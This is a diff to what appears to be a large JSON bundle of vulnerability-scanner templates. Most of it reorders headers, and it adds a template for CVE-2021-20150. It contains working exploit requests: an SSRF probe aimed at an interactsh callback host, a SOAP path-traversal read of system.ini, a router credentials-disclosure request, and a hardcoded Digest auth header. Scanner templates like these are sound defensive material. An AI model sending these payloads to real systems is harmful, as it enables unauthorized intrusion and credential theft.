@@ -8694,8 +8694,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Atlassian-Token": "no-check"
+            "X-Atlassian-Token": "no-check",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -10289,9 +10289,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml",
-            "Cookie": "Login"
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -11783,6 +11783,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/cache/backup/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-20150",
+      "info": {
+        "name": "Trendnet AC2600 TEW-827DRU - Credentials Disclosure",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /apply_sec.cgi HTTP/1.1\nHost: {{Hostname}}\n\naction=setup_wizard_cancel&html_response_page=ftpserver.asp&html_response_return_page=ftpserver.asp\n"
           ]
         }
       ]
@@ -13945,8 +13959,8 @@
       "requests": [
         {
           "headers": {
-            "Referer": "{{BaseURL}}/assets/base/home.html",
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
+            "Referer": "{{BaseURL}}/assets/base/home.html"
           },
           "method": "GET",
           "path": [
